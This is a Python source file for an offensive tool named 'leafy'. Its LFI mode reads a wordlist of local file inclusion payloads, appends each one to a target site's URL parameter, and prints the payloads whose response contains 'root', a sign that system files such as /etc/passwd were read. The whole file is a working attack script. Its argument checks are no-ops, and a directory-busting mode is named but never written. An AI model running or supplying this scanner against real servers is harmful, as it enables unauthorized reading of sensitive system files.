from inspect import ArgSpec
from sqlite3 import adapt
import argparse
import urllib.request

# Init parser
parser = argparse.ArgumentParser()

# Add Args
parser.add_argument("-m", "--mode", help="What mode to run leafy on", metavar="MODE", dest="mode", type=str, required=True)
parser.add_argument("-i", "--ip", help="The IP address of the website you are targeting", metavar="IP", dest="ip", type=str, required=True)
parser.add_argument("-p", "--port", help="The port the website is running on", metavar="PORT", dest="port", type=str, required=True)
parser.add_argument("-a", "--path", help="Full path", metavar="PATH", dest="path", type=str, required=True)
parser.add_argument("-P", "--parameter", help="The parameter to use", metavar="PARAM", dest="param", type=str)
parser.add_argument("-l", "--list", help="The full path to the list of potential LFI injections", metavar="LIST", dest="list", type=str, required=True)

# Get the args
args = parser.parse_args()

# LFI MODE
if args.mode == "lfi":

    # Test for all required arguments
    # Test for IP
    try:
        args.ip
    except:
        print('You need to indicate an IP to target')
        exit
    
    # Test for port
    try:
        args.port
    except:
        print("you need to indicate a port to target")
        exit

    # Test for path
    try:
        args.path
    except:
        print("you need to indicate a path to target")
        exit

    # Test for param
    try:
        args.param
    except:
        print("you need to indicate a parameter to target")
        exit
    
    # Test for list
    try:
        args.list
    except:
        print("you need to indicate a list")
        exit

    # Define the website
    website = "http://" + args.ip + ":" + args.port + "/" + args.path + args.param

    # Open list and read all the lines
    file = open(args.list, 'r')
    lines = file.readlines()

    # Read and loop through every line in file
    for line in lines:
        payload = website + line
        resp = urllib.request.urlopen(payload)
        page = resp.read().decode('utf-8')
        if "root" in page:
            print(payload)
        else:
            continue

# DIR BUST MODE